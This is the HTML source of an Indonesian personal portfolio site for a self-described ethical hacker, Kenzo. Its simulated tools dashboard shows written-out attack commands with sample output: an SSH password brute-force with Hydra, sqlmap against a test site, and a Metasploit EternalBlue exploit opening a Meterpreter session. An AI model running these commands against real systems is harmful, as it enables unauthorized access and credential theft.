<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KENZO - CYBER SECURITY ARCHITECT</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Fira+Code:wght@400;500&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        /* --- Global Styles & Variables --- */
        :root {
            --primary-color: #00ff41; /* Hijau Neon */
            --secondary-color: #0a84ff; /* Biru Neon */
            --accent-color: #ff453a; /* Merah Neon */
            --background-color: #0d1117; /* GitHub Dark */
            --surface-color: #161b22;
            --border-color: #30363d;
            --text-primary: #c9d1d9;
            --text-secondary: #8b949e;
            --font-heading: 'Orbitron', sans-serif;
            --font-body: 'Roboto', sans-serif;
            --font-code: 'Fira Code', monospace;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html {
            scroll-behavior: smooth;
        }

        body {
            font-family: var(--font-body);
            background-color: var(--background-color);
            color: var(--text-primary);
            line-height: 1.7;
            overflow-x: hidden;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }

        h1, h2, h3 {
            font-family: var(--font-heading);
            color: var(--primary-color);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        section {
            padding: 100px 0;
        }

        /* --- Animated Background --- */
        .bg-animation {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: -1;
            opacity: 0.05;
            background-image: url('https://www.transparenttextures.com/patterns/cubes.png');
            animation: bgMove 50s linear infinite;
        }

        @keyframes bgMove {
            from { background-position: 0 0; }
            to { background-position: 1000px 1000px; }
        }

        /* --- Header & Navigation --- */
        header {
            background: rgba(13, 17, 23, 0.8);
            backdrop-filter: blur(10px);
            padding: 20px 0;
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            border-bottom: 1px solid var(--border-color);
            transition: all 0.3s ease;
        }

        header.scrolled {
            padding: 15px 0;
            background: rgba(13, 17, 23, 0.95);
        }

        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-family: var(--font-heading);
            font-size: 1.8rem;
            font-weight: 900;
            color: var(--primary-color);
            text-decoration: none;
            text-shadow: 0 0 10px var(--primary-color);
        }

        .nav-links {
            list-style: none;
            display: flex;
            gap: 35px;
        }

        .nav-links a {
            color: var(--text-secondary);
            text-decoration: none;
            font-weight: 500;
            font-family: var(--font-heading);
            font-size: 0.9rem;
            transition: color 0.3s ease, text-shadow 0.3s ease;
        }

        .nav-links a:hover {
            color: var(--primary-color);
            text-shadow: 0 0 8px var(--primary-color);
        }

        /* --- Hero Section --- */
        .hero {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding-top: 80px;
        }

        .hero-content h1 {
            font-size: 5rem;
            font-weight: 900;
            margin-bottom: 10px;
            position: relative;
            animation: glitch 2s linear infinite;
        }

        @keyframes glitch {
            2%,64%{ transform: translate(2px,0) skew(0deg); }
            4%,60%{ transform: translate(-2px,0) skew(0deg); }
            62%{ transform: translate(0,0) skew(5deg); }
        }

        .hero-content h1:before,
        .hero-content h1:after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .hero-content h1:before {
            animation: glitch-1 0.5s infinite;
            color: var(--secondary-color);
            z-index: -1;
        }

        .hero-content h1:after {
            animation: glitch-2 0.5s infinite;
            color: var(--accent-color);
            z-index: -2;
        }

        @keyframes glitch-1 {
            0%, 100% { clip-path: inset(0 0 0 0); }
            20% { clip-path: inset(20% 0 30% 0); }
            40% { clip-path: inset(50% 0 20% 0); }
            60% { clip-path: inset(10% 0 60% 0); }
            80% { clip-path: inset(80% 0 5% 0); }
        }
        
        @keyframes glitch-2 {
             0%, 100% { clip-path: inset(0 0 0 0); }
            20% { clip-path: inset(60% 0 10% 0); }
            40% { clip-path: inset(10% 0 70% 0); }
            60% { clip-path: inset(40% 0 40% 0); }
            80% { clip-path: inset(5% 0 85% 0); }
        }

        .hero-content .subtitle {
            font-size: 1.5rem;
            color: var(--text-secondary);
            margin-bottom: 30px;
            font-family: var(--font-code);
        }

        #typing-text {
            border-right: 3px solid var(--primary-color);
            animation: blink-cursor 0.75s step-end infinite;
        }

        @keyframes blink-cursor {
            from, to { border-color: transparent; }
            50% { border-color: var(--primary-color); }
        }

        .hero-buttons {
            margin-top: 40px;
            display: flex;
            gap: 20px;
            justify-content: center;
        }

        .btn {
            padding: 15px 35px;
            border-radius: 5px;
            text-decoration: none;
            font-weight: 700;
            font-family: var(--font-heading);
            transition: all 0.3s ease;
            display: inline-block;
            cursor: pointer;
            border: 2px solid var(--primary-color);
            position: relative;
            overflow: hidden;
            z-index: 1;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: var(--primary-color);
            transition: left 0.3s ease;
            z-index: -1;
        }

        .btn:hover::before {
            left: 0;
        }

        .btn:hover {
            color: var(--background-color);
            box-shadow: 0 0 20px var(--primary-color);
        }
        
        .btn.secondary {
            color: var(--primary-color);
        }

        .btn.primary {
            background-color: var(--primary-color);
            color: var(--background-color);
        }
        
        /* --- Section Headers --- */
        .section-header {
            text-align: center;
            margin-bottom: 60px;
        }

        .section-header h2 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        .divider {
            width: 80px;
            height: 4px;
            background: linear-gradient(90deg, var(--primary-color), var(--secondary-color));
            margin: 0 auto;
        }

        /* --- About Section --- */
        .about-content {
            display: flex;
            gap: 40px;
            align-items: center;
        }

        .about-text {
            flex: 1;
        }

        .about-text p {
            color: var(--text-secondary);
            margin-bottom: 20px;
        }

        .about-image {
            flex: 1;
            text-align: center;
        }

        .about-image img {
            max-width: 80%;
            border-radius: 10px;
            border: 3px solid var(--border-color);
            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.2);
        }

        /* --- Skills Section --- */
        .skills-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
        }

        .skill-card {
            background-color: var(--surface-color);
            border: 1px solid var(--border-color);
            padding: 30px;
            border-radius: 8px;
            transition: all 0.3s ease;
        }

        .skill-card:hover {
            transform: translateY(-10px);
            border-color: var(--primary-color);
            box-shadow: 0 15px 30px rgba(0, 255, 65, 0.2);
        }

        .skill-card h3 {
            color: var(--secondary-color);
            margin-bottom: 20px;
            font-size: 1.3rem;
        }

        .skill-list {
            list-style: none;
        }

        .skill-list li {
            padding: 8px 0;
            color: var(--text-secondary);
            position: relative;
            padding-left: 25px;
        }

        .skill-list li::before {
            content: '▶';
            position: absolute;
            left: 0;
            color: var(--primary-color);
            font-size: 0.8rem;
        }

        /* --- Tools Dashboard Section --- */
        .tools-dashboard {
            background-color: var(--surface-color);
            border: 1px solid var(--primary-color);
            border-radius: 8px;
            padding: 20px;
            font-family: var(--font-code);
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
        }

        .dashboard-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 10px;
            margin-bottom: 20px;
        }

        .dashboard-header span {
            color: var(--text-secondary);
        }

        .tool-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 20px;
        }

        .tool-btn {
            padding: 10px 20px;
            background: transparent;
            border: 1px solid var(--text-secondary);
            color: var(--text-secondary);
            border-radius: 5px;
            cursor: pointer;
            font-family: var(--font-code);
            transition: all 0.3s ease;
        }

        .tool-btn:hover {
            border-color: var(--primary-color);
            color: var(--primary-color);
            box-shadow: 0 0 10px var(--primary-color);
        }

        #terminal-output {
            background: #000;
            color: var(--primary-color);
            padding: 15px;
            border-radius: 5px;
            min-height: 200px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        /* --- Timeline Section --- */
        .timeline {
            position: relative;
            max-width: 800px;
            margin: 0 auto;
        }

        .timeline::after {
            content: '';
            position: absolute;
            width: 4px;
            background-color: var(--primary-color);
            top: 0;
            bottom: 0;
            left: 50%;
            margin-left: -2px;
        }

        .timeline-item {
            padding: 10px 40px;
            position: relative;
            background-color: inherit;
            width: 50%;
        }

        .timeline-item::after {
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            right: -10px;
            background-color: var(--surface-color);
            border: 4px solid var(--primary-color);
            top: 25px;
            border-radius: 50%;
            z-index: 1;
        }

        .left {
            left: 0;
        }

        .right {
            left: 50%;
        }

        .left::before {
            content: " ";
            height: 0;
            position: absolute;
            top: 32px;
            width: 0;
            z-index: 1;
            right: 30px;
            border: medium solid var(--border-color);
            border-width: 10px 0 10px 10px;
            border-color: transparent transparent transparent var(--border-color);
        }

        .right::before {
            content: " ";
            height: 0;
            position: absolute;
            top: 32px;
            width: 0;
            z-index: 1;
            left: 30px;
            border: medium solid var(--border-color);
            border-width: 10px 10px 10px 0;
            border-color: transparent var(--border-color) transparent transparent;
        }

        .right::after {
            left: -10px;
        }

        .timeline-content {
            padding: 20px 30px;
            background-color: var(--surface-color);
            position: relative;
            border-radius: 6px;
            border: 1px solid var(--border-color);
        }
        
        /* --- Blog & Projects Grid --- */
        .content-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 30px;
        }

        .content-card {
            background-color: var(--surface-color);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            overflow: hidden;
            transition: all 0.3s ease;
            display: flex;
            flex-direction: column;
        }

        .content-card:hover {
            transform: translateY(-10px);
            border-color: var(--primary-color);
            box-shadow: 0 15px 30px rgba(0, 255, 65, 0.2);
        }

        .content-card img {
            width: 100%;
            height: 200px;
            object-fit: cover;
        }

        .card-body {
            padding: 25px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
        }

        .card-body h3 {
            margin-bottom: 15px;
            font-size: 1.3rem;
        }

        .card-body p {
            color: var(--text-secondary);
            margin-bottom: 20px;
            flex-grow: 1;
        }

        .card-footer {
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        /* --- Contact Section --- */
        .contact-content {
            display: flex;
            gap: 50px;
        }

        .contact-info {
            flex: 1;
        }

        .contact-info h3 {
            margin-bottom: 20px;
            font-size: 1.8rem;
        }

        .contact-info p {
            color: var(--text-secondary);
            margin-bottom: 20px;
        }

        .social-links {
            display: flex;
            gap: 20px;
            font-size: 1.5rem;
        }

        .social-links a {
            color: var(--text-secondary);
            transition: color 0.3s ease, transform 0.3s ease;
        }

        .social-links a:hover {
            color: var(--primary-color);
            transform: scale(1.2);
        }

        .contact-form {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .contact-form input,
        .contact-form textarea {
            width: 100%;
            padding: 15px;
            border-radius: 5px;
            border: 1px solid var(--border-color);
            background-color: var(--background-color);
            color: var(--text-primary);
            font-family: var(--font-body);
            transition: border-color 0.3s ease;
        }

        .contact-form input:focus,
        .contact-form textarea:focus {
            outline: none;
            border-color: var(--primary-color);
        }

        /* --- Footer --- */
        footer {
            text-align: center;
            padding: 30px 0;
            border-top: 1px solid var(--border-color);
            color: var(--text-secondary);
        }

        /* --- Responsive Design --- */
        @media screen and (max-width: 768px) {
            .hero-content h1 { font-size: 3rem; }
            .nav-links { display: none; } /* For simplicity, hiding nav on mobile. A hamburger menu would be better. */
            .about-content { flex-direction: column; }
            .contact-content { flex-direction: column; }
            .timeline::after { left: 31px; }
            .timeline-item { width: 100%; padding-left: 70px; padding-right: 25px; }
            .timeline-item::before { left: 60px; }
            .left::after, .right::after { left: 21px; }
            .right { left: 0%; }
            .left::before, .right::before { left: 55px; }
        }
    </style>
</head>
<body>

    <div class="bg-animation"></div>

    <header id="header">
        <nav class="container">
            <a href="#home" class="logo">KENZO</a>
            <ul class="nav-links">
                <li><a href="#home">Beranda</a></li>
                <li><a href="#about">Tentang</a></li>
                <li><a href="#skills">Keahlian</a></li>
                <li><a href="#tools">Tools</a></li>
                <li><a href="#timeline">Timeline</a></li>
                <li><a href="#blog">Blog</a></li>
                <li><a href="#projects">Proyek</a></li>
                <li><a href="#contact">Kontak</a></li>
            </ul>
        </nav>
    </header>

    <main>
        <section id="home" class="hero">
            <div class="hero-content">
                <h1 data-text="KENZO">KENZO</h1>
                <p class="subtitle"><span id="typing-text"></span></p>
                <div class="hero-buttons">
                    <a href="#projects" class="btn primary">Lihat Portofolio</a>
                    <a href="#contact" class="btn secondary">Hubungi Saya</a>
                </div>
            </div>
        </section>

        <section id="about">
            <div class="container">
                <div class="section-header">
                    <h2>Tentang Saya</h2>
                    <div class="divider"></div>
                </div>
                <div class="about-content">
                    <div class="about-text">
                        <p>Saya adalah seorang <strong>Cyber Security Architect</strong> dan <strong>Ethical Hacker</strong> dengan hasrat yang mendalam untuk memetakan dan mengamankan dunia digital. Saya tidak hanya menemukan celah; saya membangun benteng pertahanan yang kokoh.</p>
                        <p>Dengan pendekatan yang proaktif dan berbasis data, saya membantu organisasi mengidentifikasi risiko keamanan, menguji ketahanan sistem, dan merancang arsitektur keamanan yang tangguh terhadap ancaman modern. Etika dan integritas adalah fondasi dari setiap kode yang saya tulis dan setiap sistem yang saya audit.</p>
                    </div>
                    <div class="about-image">
                        <img src="https://i.ibb.co/6y2k2F4/profile-pic.png" alt="Foto Profil Kenzo">
                    </div>
                </div>
            </div>
        </section>

        <section id="skills">
            <div class="container">
                <div class="section-header">
                    <h2>Keahlian Teknis</h2>
                    <div class="divider"></div>
                </div>
                <div class="skills-grid">
                    <div class="skill-card">
                        <h3><i class="fas fa-network-wired"></i> Keamanan Jaringan</h3>
                        <ul class="skill-list">
                            <li>Advanced Network Analysis (Wireshark)</li>
                            <li>Firewall & IDS/IPS Configuration</li>
                            <li>Network Penetration Testing</li>
                            <li>VPN & Secure Network Design</li>
                        </ul>
                    </div>
                    <div class="skill-card">
                        <h3><i class="fas fa-globe"></i> Keamanan Aplikasi Web</h3>
                        <ul class="skill-list">
                            <li>Advanced Penetration Testing (Burp Suite Pro)</li>
                            <li>OWASP Top 10 & API Security (OWASP API Top 10)</li>
                            <li>Secure Code Review (SAST/DAST)</li>
                            <li>DevSecOps & CI/CD Security</li>
                        </ul>
                    </div>
                    <div class="skill-card">
                        <h3><i class="fas fa-shield-alt"></i> Keamanan Sistem & Cloud</h3>
                        <ul class="skill-list">
                            <li>System Hardening (Linux/Windows)</li>
                            <li>Container Security (Docker, Kubernetes)</li>
                            <li>Cloud Security (AWS, Azure, GCP)</li>
                            <li>Incident Response & Digital Forensics</li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>

        <section id="tools">
            <div class="container">
                <div class="section-header">
                    <h2>Dashboard Tools</h2>
                    <div class="divider"></div>
                </div>
                <div class="tools-dashboard">
                    <div class="dashboard-header">
                        <span>kenzo@cybersec:~$</span>
                        <span>Interactive Tools Simulator</span>
                    </div>
                    <div class="tool-buttons">
                        <button class="tool-btn" onclick="runTool('nmap')">Nmap</button>
                        <button class="tool-btn" onclick="runTool('hydra')">Hydra</button>
                        <button class="tool-btn" onclick="runTool('sqlmap')">SQLMap</button>
                        <button class="tool-btn" onclick="runTool('metasploit')">Metasploit</button>
                        <button class="tool-btn" onclick="runTool('nikto')">Nikto</button>
                        <button class="tool-btn" onclick="clearOutput()">Clear</button>
                    </div>
                    <div id="terminal-output">
> Welcome to the KENZO's interactive tools simulator.
> Click a button above to simulate a tool execution.
> This is for demonstration purposes only.
                    </div>
                </div>
            </div>
        </section>

        <section id="timeline">
            <div class="container">
                <div class="section-header">
                    <h2>Perjalanan Saya</h2>
                    <div class="divider"></div>
                </div>
                <div class="timeline">
                    <div class="timeline-item left">
                        <div class="timeline-content">
                            <h3>OSCP Certification</h3>
                            <p>Successfully achieved the Offensive Security Certified Professional (OSCP) certification, proving hands-on pentesting skills.</p>
                            <span class="card-footer">2022</span>
                        </div>
                    </div>
                    <div class="timeline-item right">
                        <div class="timeline-content">
                            <h3>Senior Security Analyst</h3>
                            <p>Led a team in conducting penetration tests and vulnerability assessments for Fortune 500 companies.</p>
                            <span class="card-footer">2021 - Present</span>
                        </div>
                    </div>
                    <div class="timeline-item left">
                        <div class="timeline-content">
                            <h3>Founded CyberSec Initiative</h3>
                            <p>Started a community-focused initiative to provide free security awareness training for non-profit organizations.</p>
                            <span class="card-footer">2020</span>
                        </div>
                    </div>
                    <div class="timeline-item right">
                        <div class="timeline-content">
                            <h3>Began Journey in Cybersecurity</h3>
                            <p>Started as a junior network administrator, quickly developed a passion for security and ethical hacking.</p>
                            <span class="card-footer">2018</span>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        
        <section id="blog">
            <div class="container">
                <div class="section-header">
                    <h2>Blog & Artikel</h2>
                    <div class="divider"></div>
                </div>
                <div class="content-grid">
                    <article class="content-card">
                        <div class="card-body">
                            <h3>Mengenal Serangan Zero-Day dan Cara Mitigasinya</h3>
                            <p>Pembahasan mendalam mengenai ancaman serangan zero-day, contoh kasus di dunia nyata, dan strategi terbaik untuk melindungi sistem dari ancaman yang belum diketahui.</p>
                            <span class="card-footer"><i class="far fa-calendar"></i> 15 Maret 2024</span>
                        </div>
                    </article>
                    <article class="content-card">
                        <div class="card-body">
                            <h3>Panduan Lengkap Web Application Firewall (WAF)</h3>
                            <p>Memahami apa itu WAF, bagaimana cara kerjanya, jenis-jenisnya, dan bagaimana cara mengimplementasikan dan mengkonfigurasinya dengan efektif.</p>
                            <span class="card-footer"><i class="far fa-calendar"></i> 28 Februari 2024</span>
                        </div>
                    </article>
                    <article class="content-card">
                        <div class="card-body">
                            <h3>Studi Kasus: Analisis Ransomware pada Perusahaan X</h3>
                            <p>Sebuah studi kasus anonim yang mengupas tuntas serangan ransomware, dari vektor infeksi hingga proses pemulihan dan pelajaran yang dipetik.</p>
                            <span class="card-footer"><i class="far fa-calendar"></i> 10 Januari 2024</span>
                        </div>
                    </article>
                </div>
            </div>
        </section>

        <section id="projects">
            <div class="container">
                <div class="section-header">
                    <h2>Portofolio Proyek</h2>
                    <div class="divider"></div>
                </div>
                <div class="content-grid">
                    <div class="content-card">
                        <img src="https://via.placeholder.com/400x200.png/0d1117/00ff41?text=Network+Scanner+Tool" alt="Network Scanner Tool">
                        <div class="card-body">
                            <h3>Advanced Network Scanner</h3>
                            <p>Sebuah tool berbasis Python untuk melakukan scanning jaringan secara mendalam, mengidentifikasi OS, layanan, dan kerentanan umum pada host yang aktif.</p>
                            <span class="card-footer"><i class="fab fa-python"></i> Python | Scapy</span>
                        </div>
                    </div>
                    <div class="content-card">
                        <img src="https://via.placeholder.com/400x200.png/0d1117/00ff41?text=Web+Vuln+Scanner" alt="Web Vulnerability Scanner">
                        <div class="card-body">
                            <h3>Automated Web Vulnerability Scanner</h3>
                            <p>Skrip otomatis yang dirancang untuk mendeteksi kerentanan web seperti XSS, SQL Injection, dan misconfigurasi keamanan lainnya.</p>
                            <span class="card-footer"><i class="fab fa-js"></i> Node.js | Puppeteer</span>
                        </div>
                    </div>
                    <div class="content-card">
                        <img src="https://via.placeholder.com/400x200.png/0d1117/00ff41?text=Security+Dashboard" alt="Security Dashboard">
                        <div class="card-body">
                            <h3>SIEM Dashboard for Threat Intelligence</h3>
                            <p>Sebuah dashboard interaktif untuk memvisualisasikan data ancaman keamanan dari berbagai sumber (log firewall, IDS) secara real-time.</p>
                            <span class="card-footer"><i class="fab fa-react"></i> React | Elasticsearch</span>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section id="contact">
            <div class="container">
                <div class="section-header">
                    <h2>Hubungi Saya</h2>
                    <div class="divider"></div>
                </div>
                <div class="contact-content">
                    <div class="contact-info">
                        <h3>Mari Bicara Tentang Keamanan</h3>
                        <p>Saya selalu terbuka untuk diskusi tentang proyek keamanan, kolaborasi, atau sekadar berbagi pengetahuan. Jangan ragu untuk menghubungi saya.</p>
                        <p><strong>Email:</strong> pykcyber@gmail.com</p>
                        <div class="social-links">
                            <a href="https://www.instagram.com/greysiahananta" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a>
                            <a href="https://www.linkedin.com/in/kenzo" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
                            <a href="https://github.com/kenzo" target="_blank" title="GitHub"><i class="fab fa-github"></i></a>
                            <a href="https://twitter.com/kenzo" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a>
                        </div>
                    </div>
                    <form class="contact-form" id="contact-form">
                        <input type="text" name="name" placeholder="Nama Lengkap" required>
                        <input type="email" name="email" placeholder="Email Aktif" required>
                        <textarea name="message" placeholder="Pesan Anda" rows="7" required></textarea>
                        <button type="submit" class="btn primary" style="width: 100%;"><i class="fas fa-paper-plane"></i> Kirim Pesan</button>
                    </form>
                </div>
            </div>
        </section>
    </main>

    <footer>
        <div class="container">
            <p>&copy; 2024 KENZO. All Rights Reserved. | Website ini dibuat oleh <span style="color: var(--primary-color);">Kenzo</span></p>
        </div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', () => {

            // --- Typing Effect ---
            const texts = [
                "Cyber Security Architect.",
                "Ethical Hacker & Pentester.",
                "Building a safer digital world."
            ];
            let textIndex = 0;
            let charIndex = 0;
            let isDeleting = false;
            const typingSpeed = 100;
            const deletingSpeed = 50;
            const pauseTime = 2000;
            const typingElement = document.getElementById('typing-text');

            function typeText() {
                const currentText = texts[textIndex];
                if (!isDeleting) {
                    typingElement.textContent = currentText.substring(0, charIndex + 1);
                    charIndex++;
                    if (charIndex === currentText.length) {
                        isDeleting = true;
                        setTimeout(typeText, pauseTime);
                        return;
                    }
                } else {
                    typingElement.textContent = currentText.substring(0, charIndex - 1);
                    charIndex--;
                    if (charIndex === 0) {
                        isDeleting = false;
                        textIndex = (textIndex + 1) % texts.length;
                    }
                }
                setTimeout(typeText, isDeleting ? deletingSpeed : typingSpeed);
            }
            typeText();

            // --- Header Scroll Effect ---
            window.addEventListener('scroll', () => {
                const header = document.getElementById('header');
                if (window.scrollY > 50) {
                    header.classList.add('scrolled');
                } else {
                    header.classList.remove('scrolled');
                }
            });

            // --- Tools Dashboard Simulator ---
            const terminalOutput = document.getElementById('terminal-output');
            const toolOutputs = {
                nmap: `> nmap -sV -A -T4 scanme.nmap.org\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2024-05-21 10:30 WIB\nNmap scan report for scanme.nmap.org (45.33.32.156)\nHost is up (0.22s latency).\r\nNot shown: 996 closed ports\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)\n80/tcp   open  http       Apache httpd 2.4.7 ((Ubuntu))\n9929/tcp open  nping-echo Nping echo\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.34 seconds`,
                hydra: `> hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1\n\nHydra v9.1 (c) 2020 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\n[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task\n[DATA] attacking ssh://192.168.1.1:22/\n[STATUS] 345.00 tries/min, 345 tries in 00:01h, 14344044 to go in 692:08h, 16 active\n[22][ssh] host: 192.168.1.1   login: admin   password: password123\n[STATUS] attack finished for 192.168.1.1 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found`,
                sqlmap: `> sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs\n\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.7.3#stable}\n|_ -| . [.]     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal...\n\n[...]\nweb application technology: PHP, Apache, 5.4.45\nback-end DBMS: MySQL >= 5.0.12\n[...]\navailable databases [2]:\n[*] acuart\n[*] information_schema`,
                metasploit: `> msfconsole\n\n       =[ metasploit v6.3.2-dev                          ]\n+ -- --=[ 2233 exploits - 1193 auxiliary - 398 post       ]\n+ -- --=[ 638 payloads - 45 encoders - 11 nops            ]\n+ -- --=[ 9 evasion modules                               ]\n\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100\nRHOSTS => 192.168.1.100\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > exploit\n\n[*] 192.168.1.100:445 - Target appears to be vulnerable...\n[*] 192.168.1.100:445 - Scanning for unpatched systems...\n[*] 192.168.1.100:445 - Exploiting target...\n[*] Sending stage (201283 bytes) to 192.168.1.100\n[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.100:49158) at 2024-05-21 10:35:00 +0700\n\nmeterpreter >`,
                nikto: `> nikto -h http://192.168.1.15\n\n- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:       192.168.1.15\n+ Target Hostname: 192.168.1.15\n+ Target Port:     80\n+ Start Time:      2024-05-21 10:40:00 (GMT7)\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.41 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.\n+ Retrieved x-powered-by header: PHP/7.4.33\n+ OSVDB-3268: /admin/: Directory indexing found.\n+ /admin/: Admin login page found.\n+ 7753 requests: 0 error(s) and 5 item(s) reported on remote host\n+ End Time:           2024-05-21 10:42:15 (GMT7) (135 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested`
            };

            function runTool(toolName) {
                terminalOutput.textContent = `> Executing ${toolName.toUpperCase()}...\n\n${toolOutputs[toolName]}`;
            }

            function clearOutput() {
                terminalOutput.textContent = '> Terminal output cleared.';
            }

            // --- Form Submission ---
            const contactForm = document.getElementById('contact-form');
            contactForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const name = e.target.querySelector('input[type="text"]').value;
                alert(`Terima kasih, ${name}! Pesan Anda telah diterima. Saya akan segera menghubungi Anda kembali.`);
                contactForm.reset();
            });

        });
    </script>
</body>
</html>
